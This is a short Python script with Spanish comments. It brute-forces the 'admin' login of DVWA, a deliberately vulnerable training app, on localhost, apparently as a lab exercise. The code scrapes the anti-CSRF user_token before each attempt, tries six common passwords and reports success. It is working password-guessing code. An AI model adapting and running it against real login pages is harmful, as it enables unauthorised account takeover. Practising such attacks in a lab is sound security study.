import requests
import time
from bs4 import BeautifulSoup

# URL de login
login_url = "http://localhost:8080/login.php"

# Usuario fijo
usuario = "admin"

# Lista de contraseñas a probar (máx. 6 intentos)
lista_passwords = ["123456", "admin", "toor", "root", "password", "colima123"]

# Iniciar sesión con cookies
session = requests.Session()

print("🔐 Iniciando fuerza bruta a DVWA...\n")

intentos_realizados = 0
contraseña_encontrada = None

for intento, contraseña in enumerate(lista_passwords[:6], start=1):
    intentos_realizados += 1

    print(f"[{intento}] Probando contraseña: {contraseña}")

    # 1. Obtener el user_token desde el formulario
    login_page = session.get(login_url)
    soup = BeautifulSoup(login_page.text, 'html.parser')
    token_input = soup.find("input", {"name": "user_token"})

    user_token = token_input['value'] if token_input else ""

    # 2. Crear payload incluyendo el token
    payload = {
        "username": usuario,
        "password": contraseña,
        "Login": "Login",
        "user_token": user_token
    }

    # 3. Enviar POST con token incluido
    response = session.post(login_url, data=payload, allow_redirects=True)

    if "Welcome to Damn Vulnerable Web Application" in response.text:
        contraseña_encontrada = contraseña
        print(f"\n ¡Contraseña encontrada!: '{contraseña}' en el intento #{intento}")
        break
    else:
        print("❌ Contraseña incorrecta.\n")
        time.sleep(1)

# Resultado final
print("\nResumen del ataque:")
print(f" Intentos totales realizados: {intentos_realizados}")

if contraseña_encontrada:
    print(f"Login exitoso con contraseña: {contraseña_encontrada}")
else:
    print(" No se logró acceder al sistema tras 6 intentos.")
